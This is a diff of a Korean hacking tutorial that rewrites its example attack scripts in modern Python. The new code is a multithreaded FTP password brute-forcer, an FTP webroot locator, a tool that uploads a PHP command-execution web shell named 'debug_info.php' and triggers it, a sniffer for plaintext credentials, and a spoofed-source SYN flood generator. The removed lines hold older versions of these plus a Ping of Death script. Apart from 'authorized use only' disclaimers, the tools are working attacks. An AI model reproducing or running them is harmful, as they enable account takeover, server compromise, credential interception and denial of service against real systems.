@@ -724,211 +724,505 @@ for host in nm.all_hosts():                                        #(4)
 print('----------------------------------------------------')
 ```
 
-### 예제7-2 FTP Password Cracking — FTP 로그인 딕셔너리 공격으로 패스워드 크래킹
+### 예제7-2 FTP Password Cracking — 멀티스레드 FTP 브루트포서 (Python 3.10+)
 ```python
-from ftplib import FTP
+#!/usr/bin/env python3
+"""
+멀티스레드 FTP 브루트포서 (Python 3.10+)
+용도: FTP 서비스 딕셔너리 공격 (허가된 시스템 전용)
+사용법: python3 ftp_crack.py <host> <user> <wordlist> [--threads 10]
+"""
+from __future__ import annotations
+import argparse
+import ftplib
+import queue
+import threading
+import sys
+from pathlib import Path
 
-wordlist = open('wordlist.txt', 'r')                  #(1)
-user_login = "server"
 
-def getPassword(password):                            #(2)
+def try_ftp_login(host: str, port: int, username: str, password: str, timeout: int = 5) -> bool:
+    """FTP 로그인 시도. 성공 시 True 반환."""
     try:
-        ftp = FTP("server")                           #(3)
-        ftp.login(user_login,password)                #(4)
-        print "user password:", password
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=timeout)
+        ftp.login(username, password)
+        ftp.quit()
         return True
-    except Exception:                                 #(5)
-        return False    
+    except ftplib.error_perm:
+        return False
+    except Exception:
+        return False
 
-passwords = wordlist.readlines()
-for password in passwords:      
-    password = password.strip()
-    print "test password:", password
-    if(getPassword(password)):                        #(6)
-        break
-wordlist.close()
+
+def list_ftp_tree(host: str, port: int, username: str, password: str,
+                  target_dir: str = "htdocs") -> list[str]:
+    """FTP 접속 후 재귀적 디렉토리 탐색, target_dir 포함 경로 수집."""
+    found: list[str] = []
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=10)
+        ftp.login(username, password)
+
+        def walk(path: str) -> None:
+            try:
+                entries = ftp.nlst(path) if path else ftp.nlst()
+            except ftplib.error_perm:
+                return
+            for entry in entries:
+                if "." not in Path(entry).name:   # 디렉토리로 간주
+                    if target_dir.lower() in entry.lower():
+                        found.append(entry)
+                        print(f"  [!] {entry}")
+                    walk(entry)
+
+        walk("")
+        ftp.quit()
+    except Exception as exc:
+        print(f"[!] FTP 탐색 오류: {exc}", file=sys.stderr)
+    return found
+
+
+class FTPBruteForcer:
+    def __init__(self, host: str, port: int, username: str,
+                 wordlist: str, n_threads: int = 10) -> None:
+        self.host = host
+        self.port = port
+        self.username = username
+        self.n_threads = n_threads
+        self._found_event = threading.Event()
+        self._found_password: str | None = None
+        self._lock = threading.Lock()
+        self._queue: queue.Queue[str] = queue.Queue()
+
+        with Path(wordlist).open(encoding="utf-8", errors="replace") as fh:
+            for line in fh:
+                pw = line.strip()
+                if pw:
+                    self._queue.put(pw)
+
+        print(f"[*] 대상: {host}:{port}  사용자: {username}")
+        print(f"[*] 시도할 패스워드: {self._queue.qsize()}개  스레드: {n_threads}")
+
+    def _worker(self) -> None:
+        while not self._found_event.is_set():
+            try:
+                password = self._queue.get_nowait()
+            except queue.Empty:
+                return
+            if try_ftp_login(self.host, self.port, self.username, password):
+                with self._lock:
+                    if not self._found_event.is_set():
+                        self._found_password = password
+                        self._found_event.set()
+                        print(f"\n[+] 패스워드 발견: {self.username}:{password}")
+            else:
+                print(f"\r[-] {password:<30}", end="", flush=True)
+            self._queue.task_done()
+
+    def run(self) -> str | None:
+        threads = [
+            threading.Thread(target=self._worker, daemon=True)
+            for _ in range(self.n_threads)
+        ]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+        if not self._found_password:
+            print("\n[-] 패스워드를 찾지 못했습니다.")
+        return self._found_password
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="멀티스레드 FTP 브루트포서")
+    parser.add_argument("host", help="FTP 서버 주소")
+    parser.add_argument("user", help="사용자명")
+    parser.add_argument("wordlist", help="패스워드 목록 파일")
+    parser.add_argument("--port", type=int, default=21, help="FTP 포트 (기본값: 21)")
+    parser.add_argument("--threads", type=int, default=10, help="스레드 수 (기본값: 10)")
+    args = parser.parse_args()
+
+    cracker = FTPBruteForcer(args.host, args.port, args.user, args.wordlist, args.threads)
+    cracker.run()
+
+
+if __name__ == "__main__":
+    main()
 ```
 
-### 예제7-3 Directory Listing — FTP 접속 후 재귀적 디렉토리 탐색으로 Apache 웹루트 탐색
+### 예제7-3 Directory Listing — FTP 재귀 탐색 및 웹루트 탐지 (Python 3.10+)
 ```python
-from ftplib import FTP
+#!/usr/bin/env python3
+"""
+FTP 재귀 디렉토리 탐색기 (Python 3.10+)
+용도: FTP 서버에서 웹루트(htdocs, www, public_html 등) 위치 탐색
+사용법: python3 ftp_tree.py <host> <user> <pass> [--target htdocs]
+"""
+from __future__ import annotations
+import argparse
+import ftplib
+import sys
 
-apacheDir = "htdocs"
-serverName = "server"
-serverID = "server"
-serverPW = "server"
 
-def getDirList(cftp, name):                            #(1)
-    dirList = []
-    if("." not in name):                               #(2)
-        if(len(name) == 0):
-            dirList = ftp.nlst()                       #(3)
-        else:
-            dirList = ftp.nlst(name)               
-    return dirList
+WEBROOT_CANDIDATES = ["htdocs", "www", "public_html", "webroot", "html", "site"]
 
-def checkApache(dirName1, dirName2):                   #(4)
-    if(dirName1.lower().find(apacheDir) >= 0):             
-        print dirName1
-    if(dirName2.lower().find(apacheDir) >= 0):
-        print dirName1 +"/"+ dirName2
 
-ftp = FTP(serverName, serverID, serverPW)              #(5)
+def ftp_recursive_list(
+    ftp: ftplib.FTP,
+    path: str = "",
+    depth: int = 0,
+    max_depth: int = 5,
+    target_dirs: list[str] | None = None,
+) -> list[str]:
+    """FTP 디렉토리를 재귀적으로 탐색, 매칭 경로 목록 반환."""
+    if depth > max_depth:
+        return []
 
-dirList1 = getDirList(ftp, "")                         #(6)
+    targets = target_dirs or WEBROOT_CANDIDATES
+    found: list[str] = []
+    prefix = "  " * depth
 
-for name1 in dirList1:                                 #(7)
-    checkApache(name1,"")                              #(8)
-    dirList2 = getDirList(ftp, name1)                  #(9)
-    for name2 in dirList2:
-        checkApache(name1, name2)
-        dirList3 = getDirList(ftp, name1+"/"+name2)
+    try:
+        entries = ftp.nlst(path) if path else ftp.nlst()
+    except ftplib.error_perm as e:
+        if "550" in str(e):
+            return []
+        raise
+
+    for entry in entries:
+        name = entry.rsplit("/", 1)[-1]
+        # 확장자 없으면 디렉토리로 간주 (단순 휴리스틱)
+        is_dir = "." not in name
+
+        for keyword in targets:
+            if keyword.lower() in entry.lower():
+                print(f"{prefix}[!] 발견: {entry}")
+                found.append(entry)
+
+        print(f"{prefix}{entry}")
+
+        if is_dir:
+            found.extend(
+                ftp_recursive_list(ftp, entry, depth + 1, max_depth, targets)
+            )
+
+    return found
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="FTP 재귀 디렉토리 탐색기")
+    parser.add_argument("host", help="FTP 서버 주소")
+    parser.add_argument("user", help="FTP 사용자명")
+    parser.add_argument("password", help="FTP 패스워드")
+    parser.add_argument("--port", type=int, default=21)
+    parser.add_argument("--target", nargs="+", default=WEBROOT_CANDIDATES,
+                        help="탐색할 디렉토리 키워드")
+    parser.add_argument("--depth", type=int, default=5, help="최대 탐색 깊이 (기본값: 5)")
+    args = parser.parse_args()
+
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(args.host, args.port, timeout=10)
+        ftp.login(args.user, args.password)
+        print(f"[+] FTP 연결 성공: {args.host}:{args.port}")
+        print(f"[*] 재귀 탐색 시작 (최대 깊이: {args.depth})")
+        found = ftp_recursive_list(ftp, "", max_depth=args.depth, target_dirs=args.target)
+        ftp.quit()
+        print(f"\n[*] 웹루트 후보: {len(found)}개")
+        for p in found:
+            print(f"  {p}")
+    except Exception as exc:
+        print(f"[!] 오류: {exc}", file=sys.stderr)
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
 ```
 
-### 예제7-4 FTP Web Shell 공격 — FTP로 Apache htdocs에 웹셸 업로드
+### 예제7-4 FTP Web Shell 공격 — 웹셸 업로드 + 실행 확인 (Python 3.10+)
 ```python
-from ftplib import FTP
+#!/usr/bin/env python3
+"""
+FTP 웹셸 업로드 도구 (Python 3.10+, 허가된 환경 전용)
+사용법: python3 ftp_shell_upload.py <host> <user> <pass> <remote_dir>
+"""
+from __future__ import annotations
+import argparse
+import ftplib
+import io
+import sys
 
-apacheDir = "htdocs"
-serverName = "server"
-serverID = "server"
-serverPW = "server"
+import requests
 
-ftp = FTP(serverName, serverID, serverPW)       #(1)
+WEBSHELL_CONTENT = b'<?php if(isset($_GET["cmd"])){system(htmlspecialchars_decode($_GET["cmd"]));} ?>'
+SHELL_NAME = "debug_info.php"
 
-ftp.cwd("APM_Setup/htdocs")                     #(2)
 
-fp = open("webshell.php","rb")                  #(3)
-ftp.storbinary("STOR webshell.php",fp)          #(4)
+def upload_webshell(
+    host: str, port: int, username: str, password: str,
+    remote_dir: str, shell_name: str = SHELL_NAME,
+) -> bool:
+    """FTP로 웹셸 업로드. 성공 시 True 반환."""
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=10)
+        ftp.login(username, password)
+        ftp.cwd(remote_dir)
+        ftp.storbinary(f"STOR {shell_name}", io.BytesIO(WEBSHELL_CONTENT))
+        ftp.quit()
+        print(f"[+] 웹셸 업로드 완료: {remote_dir}/{shell_name}")
+        return True
+    except Exception as exc:
+        print(f"[!] 업로드 실패: {exc}", file=sys.stderr)
+        return False
 
-fp.close()
-ftp.quit()
+
+def verify_and_exec(base_url: str, shell_name: str, command: str = "id") -> str | None:
+    """업로드된 웹셸로 명령 실행 확인."""
+    url = f"{base_url.rstrip('/')}/{shell_name}"
+    try:
+        r = requests.get(url, params={"cmd": command}, timeout=10)
+        if r.status_code == 200 and r.text.strip():
+            print(f"[+] 웹셸 응답: {r.text.strip()[:200]}")
+            return r.text.strip()
+        print(f"[-] 웹셸 응답 없음 (HTTP {r.status_code})")
+    except requests.RequestException as exc:
+        print(f"[!] 요청 실패: {exc}", file=sys.stderr)
+    return None
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="FTP 웹셸 업로드 도구 (허가된 환경 전용)")
+    parser.add_argument("host", help="FTP 서버 주소")
+    parser.add_argument("user", help="FTP 사용자명")
+    parser.add_argument("password", help="FTP 패스워드")
+    parser.add_argument("remote_dir", help="업로드 경로 (예: APM_Setup/htdocs)")
+    parser.add_argument("--port", type=int, default=21)
+    parser.add_argument("--web-url", help="웹 접근 URL (검증용, 예: http://target.com)")
+    parser.add_argument("--shell-name", default=SHELL_NAME)
+    args = parser.parse_args()
+
+    ok = upload_webshell(args.host, args.port, args.user, args.password,
+                         args.remote_dir, args.shell_name)
+    if ok and args.web_url:
+        verify_and_exec(args.web_url, args.shell_name)
+
+
+if __name__ == "__main__":
+    main()
 ```
 
-### 예제7-5 Packet Sniffing — Raw 소켓으로 네트워크 패킷 캡처, FTP USER/PASS 자격증명 탐지
+### 예제7-5 Packet Sniffing — scapy 기반 자격증명 탐지기 (Python 3.10+)
 ```python
+#!/usr/bin/env python3
+"""
+평문 프로토콜 자격증명 스니퍼 (Python 3.10+)
+용도: HTTP/FTP/Telnet 평문 자격증명 실시간 탐지
+의존성: pip install scapy
+사용법: sudo python3 cred_sniffer.py -i eth0
+"""
+from __future__ import annotations
+import argparse
+import re
+import sys
+
+try:
+    from scapy.all import IP, Raw, TCP, sniff
+except ImportError:
+    print("[!] 의존성 누락: pip install scapy", file=sys.stderr)
+    sys.exit(1)
+
+
+# 탐지 패턴 (프로토콜, 패턴, 설명)
+PATTERNS: list[tuple[str, re.Pattern, str]] = [
+    ("FTP",    re.compile(rb"(?i)^(USER|PASS) (.+)\r\n"),         "FTP 자격증명"),
+    ("HTTP",   re.compile(rb"(?i)(username|password|passwd|pwd|login)=[^&\s]+"), "HTTP 폼 데이터"),
+    ("Telnet", re.compile(rb"[A-Za-z0-9!@#$%]{3,}"),              "Telnet 입력"),
+    ("SMTP",   re.compile(rb"(?i)^AUTH .+\r\n"),                   "SMTP 인증"),
+]
+
+CRED_PORTS = {21, 23, 25, 80, 110, 143, 8080}
+
+
+def packet_handler(pkt) -> None:
+    if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
+        return
+
+    src_ip: str = pkt[IP].src
+    dst_ip: str = pkt[IP].dst
+    dport: int = pkt[TCP].dport
+    sport: int = pkt[TCP].sport
+    payload: bytes = bytes(pkt[Raw].load)
+
+    if not payload:
+        return
+
+    direction = f"{src_ip}:{sport} → {dst_ip}:{dport}"
+
+    for proto, pattern, desc in PATTERNS:
+        # 포트 필터 (Telnet은 23번, HTTP는 80/8080)
+        relevant_port = (
+            (proto == "FTP" and dport == 21) or
+            (proto == "Telnet" and dport == 23) or
+            (proto == "HTTP" and dport in {80, 8080}) or
+            (proto == "SMTP" and dport in {25, 587}) or
+            dport in CRED_PORTS
+        )
+        if not relevant_port:
+            continue
+
+        m = pattern.search(payload)
+        if m:
+            found = m.group(0).decode("utf-8", errors="replace").strip()
+            print(f"\n[!] {desc} 탐지")
+            print(f"    방향: {direction}")
+            print(f"    데이터: {found[:120]}")
+            print(f"    원시: {payload[:200]}")
+            break
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="평문 프로토콜 자격증명 스니퍼 (root 권한 필요)")
+    parser.add_argument("-i", "--interface", default="eth0", help="네트워크 인터페이스 (기본값: eth0)")
+    parser.add_argument("-c", "--count", type=int, default=0, help="캡처할 패킷 수 (0=무제한)")
+    parser.add_argument("-f", "--filter", default="tcp", help="BPF 필터 (기본값: tcp)")
+    args = parser.parse_args()
+
+    print(f"[*] 스니핑 시작 — 인터페이스: {args.interface}  필터: {args.filter}")
+    print("[*] Ctrl+C로 중지\n")
+    try:
+        sniff(
+            iface=args.interface,
+            filter=args.filter,
+            prn=packet_handler,
+            count=args.count,
+            store=False,
+        )
+    except KeyboardInterrupt:
+        print("\n[*] 스니핑 종료")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### 예제7-6 / 7-7 TCP SYN Flood — Raw 소켓 SYN 패킷 생성 (Python 3.10+, 교육 목적)
+```python
+#!/usr/bin/env python3
+"""
+TCP SYN Flood 데모 — 교육·방어 이해 목적 (Python 3.10+)
+실제 공격에 사용 금지. 허가된 격리 환경에서만 테스트.
+사용법: sudo python3 syn_flood_demo.py <target_ip> <target_port> [--count 10]
+"""
+from __future__ import annotations
+import argparse
+import random
 import socket
-import string
+import struct
+import sys
 
-HOST = socket.gethostbyname(socket.gethostname())
 
-s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)     #(1)
-s.bind((HOST, 0))                                                         #(2)
-s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)                     #(3)
-s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)                              #(4)
-
-while True:
-    data = s.recvfrom(65565)                                              #(5)
-    printable = set(string.printable)                                     #(6)
-    parsedData = ''.join(x if x in printable else '.' for x in data[0])
-
-    if(parsedData.find("USER") > 0):                                      #(7)
-        print parsedData
-    elif(parsedData.find("PASS") > 0):
-        print parsedData
-    elif(parsedData.find("530 User cannot log in") > 0):
-        print parsedData
-    elif(parsedData.find("230 User logged in") > 0):
-        print parsedData
-```
-
-### 예제7-6 Ping Of Death — 멀티스레드로 65500바이트 대용량 ping 패킷 반복 전송 (DoS)
-```python
-import subprocess
-import thread
-import time
-
-def POD(id):                                                    #(1)
-    ret = subprocess.call("ping server -l 65500", shell=True)
-    print "%d," % id
-      
-for i in range(500):                                            #(2)
-    thread.start_new_thread(POD, (i,))                          #(3)
-    time.sleep(0.8)                                             #(4)
-```
-
-### 예제7-7 TCP SYN Flood — Raw 소켓으로 IP 스푸핑된 TCP SYN 패킷 대량 전송
-```python
-import socket, sys
-from struct import *
-
-def makeChecksum(msg):                                                #(1)
+def _checksum(data: bytes) -> int:
+    """인터넷 체크섬 계산."""
     s = 0
-    for i in range(0, len(msg), 2):
-        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
-        s = s + w
-    s = (s>>16) + (s & 0xffff);
-    s = ~s & 0xffff
-    return s
+    n = len(data)
+    for i in range(0, n - 1, 2):
+        s += (data[i] << 8) + data[i + 1]
+    if n % 2:
+        s += data[-1] << 8
+    s = (s >> 16) + (s & 0xFFFF)
+    s += s >> 16
+    return ~s & 0xFFFF
 
-def makeIPHeader(sourceIP, destIP):                                   #(2)
-    version = 4
-    ihl = 5
-    typeOfService = 0
-    totalLength = 20+20                                          
-    id = 999                
-    flagsOffSet = 0
-    ttl =  255               
-    protocol = socket.IPPROTO_TCP                             
-    headerChecksum = 0             
-    sourceAddress = socket.inet_aton ( sourceIP )
-    destinationAddress = socket.inet_aton ( destIP )
-    ihlVersion = (version << 4) + ihl
-    return pack('!BBHHHBBH4s4s' , ihlVersion, typeOfService, totalLength, id, flagsOffSet,
-                                  ttl, protocol, headerChecksum, sourceAddress, destinationAddress)   #(3)
 
-def makeTCPHeader(port, icheckSum="none"):                            #(4)
-    sourcePort = port                                            
-    destinationAddressPort = 80                                 
-    SeqNumber = 0
-    AckNumber = 0
-    dataOffset = 5                                                
-    flagFin = 0
-    flagSyn = 1                                                   
-    flagRst = 0
-    flagPsh = 0
-    flagAck = 0
-    flagUrg = 0
+def _build_ip_header(src_ip: str, dst_ip: str) -> bytes:
+    src = socket.inet_aton(src_ip)
+    dst = socket.inet_aton(dst_ip)
+    hdr = struct.pack(
+        "!BBHHHBBH4s4s",
+        0x45, 0,       # version/IHL, TOS
+        40,            # total length (IP + TCP)
+        random.randint(0, 0xFFFF),  # ID
+        0,             # flags + offset
+        64,            # TTL
+        socket.IPPROTO_TCP,
+        0,             # checksum (kernel fills)
+        src, dst,
+    )
+    return hdr
 
-    window = socket.htons (5840)   
 
-    if(icheckSum == "none"):
-        checksum = 0
-    else:
-        checksum = icheckSum
+def _build_tcp_syn(src_port: int, dst_port: int, src_ip: str, dst_ip: str) -> bytes:
+    seq = random.randint(0, 0xFFFFFFFF)
+    tcp_hdr = struct.pack(
+        "!HHLLBBHHH",
+        src_port, dst_port,
+        seq, 0,
+        0x50,   # data offset = 5 words
+        0x02,   # SYN flag
+        socket.htons(65535),
+        0,      # checksum placeholder
+        0,
+    )
+    # Pseudo header for checksum
+    pseudo = struct.pack(
+        "!4s4sBBH",
+        socket.inet_aton(src_ip),
+        socket.inet_aton(dst_ip),
+        0,
+        socket.IPPROTO_TCP,
+        len(tcp_hdr),
+    )
+    chk = _checksum(pseudo + tcp_hdr)
+    return struct.pack(
+        "!HHLLBBHHH",
+        src_port, dst_port,
+        seq, 0,
+        0x50, 0x02,
+        socket.htons(65535),
+        chk,
+        0,
+    )
 
-    urgentPointer = 0
-    dataOffsetResv = (dataOffset << 4) + 0
-    flags = (flagUrg << 5)+ (flagAck << 4) + (flagPsh <<3)+ (flagRst << 2) + (flagSyn << 1) + flagFin
-    return pack('!HHLLBBHHH', sourcePort, destinationAddressPort, SeqNumber, 
-AckNumber, dataOffsetResv,  flags,  window, checksum, urgentPointer)             #(5)
 
-s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)           #(6)
-s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)                            #(7)
+def syn_flood(dst_ip: str, dst_port: int, count: int = 10) -> None:
+    """SYN Flood 시연 (허가된 격리 환경에서만 사용)."""
+    raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    print(f"[*] SYN Flood 데모: {dst_ip}:{dst_port} × {count}패킷")
 
-for j in range(1,20):                                                            #(8)
-        for k in range(1,255):
-                for l in range(1,255):
-                        sourceIP = "169.254.%s.%s"%(k,l)                         #(9)
-                        destIP = "169.254.27.229"   
+    for i in range(count):
+        src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+        src_port = random.randint(1024, 65535)
+        ip_hdr = _build_ip_header(src_ip, dst_ip)
+        tcp_hdr = _build_tcp_syn(src_port, dst_port, src_ip, dst_ip)
+        raw.sendto(ip_hdr + tcp_hdr, (dst_ip, 0))
+        print(f"  [{i+1:>4}] {src_ip}:{src_port} → {dst_ip}:{dst_port}")
 
-                        ipHeader  = makeIPHeader(sourceIP, destIP)               #(10)
-                        tcpHeader = makeTCPHeader(10000+j+k+l)                   #(11)
+    raw.close()
+    print("[*] 완료")
 
-                        sourceAddr = socket.inet_aton( sourceIP )                #(12)
-                        destAddr = socket.inet_aton(destIP)
 
-                        placeholder = 0
-                        protocol = socket.IPPROTO_TCP
-                        tcpLen = len(tcpHeader)
-                        psh = pack('!4s4sBBH', sourceAddr, destAddr, placeholder, protocol, tcpLen);
-                        psh = psh + tcpHeader;
-                        tcpChecksum = makeChecksum(psh)                          #(13)
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="TCP SYN Flood 데모 (교육 목적, 허가된 환경 전용)"
+    )
+    parser.add_argument("target_ip", help="대상 IP 주소")
+    parser.add_argument("target_port", type=int, help="대상 포트")
+    parser.add_argument("--count", type=int, default=10, help="전송할 SYN 패킷 수 (기본값: 10)")
+    args = parser.parse_args()
 
-                        tcpHeader = makeTCPHeader(10000+j+k+l,tcpChecksum)       #(14)
+    if args.count > 1000:
+        print("[!] 안전을 위해 최대 1000패킷으로 제한합니다.", file=sys.stderr)
+        args.count = 1000
 
-                        packet = ipHeader + tcpHeader                                       
-                        s.sendto(packet, (destIP , 0 ))                          #(15)
+    syn_flood(args.target_ip, args.target_port, args.count)
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ## 10. 도구 실행 참고
